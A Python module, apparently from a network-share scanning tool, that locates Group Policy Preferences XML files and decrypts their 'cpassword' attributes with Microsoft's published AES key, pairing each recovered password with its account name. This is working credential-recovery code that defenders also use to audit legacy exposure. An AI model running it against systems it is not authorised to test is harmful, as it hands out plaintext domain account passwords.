"""
snafflesnake.gpp
~~~~~~~~~~~
Decrypt Group Policy Preferences (GPP) ``cpassword`` values.

GPP let admins push local-account passwords, scheduled-task creds, mapped-
drive creds, etc. via XML files in SYSVOL (Groups.xml, Services.xml,
ScheduledTasks.xml, DataSources.xml, Drives.xml, Printers.xml). The
password sits in a ``cpassword`` attribute, AES-256-CBC encrypted with a
static key that Microsoft published in the MS-GPPREF protocol spec
(section 2.2.1.1.4, "Password Encryption"), with a 16-byte zero IV. That
makes every such value trivially recoverable -- this is the same technique
used by NetExec/CrackMapExec, Metasploit's smb_enum_gpp, and gpp-decrypt.

MS14-025 stopped admins creating *new* GPP passwords, but the key is public
and legacy XML files linger in SYSVOL for years, so recovery stays relevant.
"""
from __future__ import annotations

import base64
import re
from dataclasses import dataclass

try:  # impacket ships pycryptodomex (Cryptodome); prefer it, no new dep
    from Cryptodome.Cipher import AES
except ImportError:  # pragma: no cover - fallback for pycryptodome installs
    from Crypto.Cipher import AES  # type: ignore

# The static AES-256 key published by Microsoft in MS-GPPREF 2.2.1.1.4.
_GPP_AES_KEY = bytes.fromhex(
    "4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b"
)
_GPP_IV = b"\x00" * 16

# Match a whole XML element that carries a cpassword attribute, so we can
# also pull the associated account name from the same element.
_ELEMENT_RE = re.compile(r"<[^<>]*\bcpassword\s*=\s*\"[^\"]*\"[^<>]*>", re.IGNORECASE)
_CPASSWORD_RE = re.compile(r"\bcpassword\s*=\s*\"([^\"]*)\"", re.IGNORECASE)
# Attributes that name the account the password belongs to, in priority order.
_ACCOUNT_ATTRS = ("userName", "accountName", "runAs", "newName", "username", "name")


@dataclass
class GppSecret:
    ciphertext: str  # the base64 cpassword value
    password: str  # decrypted plaintext ("" if decryption failed)
    account: str  # associated account name, if found
    error: str = ""  # populated if decryption failed


def decrypt_cpassword(cpassword: str) -> str:
    """Decrypt a single base64 ``cpassword`` value to plaintext.

    Raises ValueError on malformed input or decryption failure.
    """
    if cpassword is None:
        raise ValueError("cpassword is None")
    cpw = cpassword.strip().replace("\n", "").replace("\r", "")
    if cpw == "":
        raise ValueError("empty cpassword (no password set)")

    # GPP base64 omits padding; restore it.
    remainder = len(cpw) % 4
    if remainder == 1:
        raise ValueError("invalid base64 length for a cpassword value")
    if remainder:
        cpw += "=" * (4 - remainder)

    try:
        blob = base64.b64decode(cpw)
    except (ValueError, base64.binascii.Error) as e:  # type: ignore[attr-defined]
        raise ValueError(f"not valid base64: {e}") from e

    if len(blob) == 0 or len(blob) % 16 != 0:
        raise ValueError("ciphertext length is not a multiple of the AES block size")

    decrypted = AES.new(_GPP_AES_KEY, AES.MODE_CBC, iv=_GPP_IV).decrypt(blob)

    # Strip PKCS#7 padding defensively.
    pad = decrypted[-1]
    if 1 <= pad <= 16 and decrypted[-pad:] == bytes([pad]) * pad:
        decrypted = decrypted[:-pad]

    try:
        return decrypted.decode("utf-16-le")
    except UnicodeDecodeError as e:
        raise ValueError(f"decrypted bytes are not valid UTF-16LE: {e}") from e


def _account_for(element: str) -> str:
    for attr in _ACCOUNT_ATTRS:
        m = re.search(attr + r'\s*=\s*"([^"]*)"', element, re.IGNORECASE)
        if m and m.group(1).strip():
            return m.group(1).strip()
    return ""


def extract_gpp_secrets(text: str) -> list[GppSecret]:
    """Find every non-empty ``cpassword`` in an XML blob and decrypt it,
    pairing each with its account name where available.
    """
    if "cpassword" not in text.lower():
        return []

    secrets: list[GppSecret] = []
    seen: set[tuple[str, str]] = set()

    # First pass: full elements (lets us grab the account name too).
    for element in _ELEMENT_RE.findall(text):
        cm = _CPASSWORD_RE.search(element)
        if not cm:
            continue
        cipher = cm.group(1)
        if cipher.strip() == "":
            continue
        account = _account_for(element)
        key = (cipher, account)
        if key in seen:
            continue
        seen.add(key)
        try:
            secrets.append(GppSecret(cipher, decrypt_cpassword(cipher), account))
        except ValueError as e:
            secrets.append(GppSecret(cipher, "", account, error=str(e)))

    # Second pass: any bare cpassword attrs not caught as a full element
    # (e.g. odd formatting), so we never silently miss one.
    for cm in _CPASSWORD_RE.finditer(text):
        cipher = cm.group(1)
        if cipher.strip() == "":
            continue
        if any(cipher == s.ciphertext for s in secrets):
            continue
        try:
            secrets.append(GppSecret(cipher, decrypt_cpassword(cipher), ""))
        except ValueError as e:
            secrets.append(GppSecret(cipher, "", "", error=str(e)))

    return secrets


# GPP XML filenames worth force-scanning even if no other rule fires.
GPP_FILENAMES = frozenset(
    n.lower()
    for n in (
        "Groups.xml",
        "Services.xml",
        "ScheduledTasks.xml",
        "DataSources.xml",
        "Drives.xml",
        "Printers.xml",
    )
)


def is_gpp_file(filename: str) -> bool:
    return filename.lower() in GPP_FILENAMES
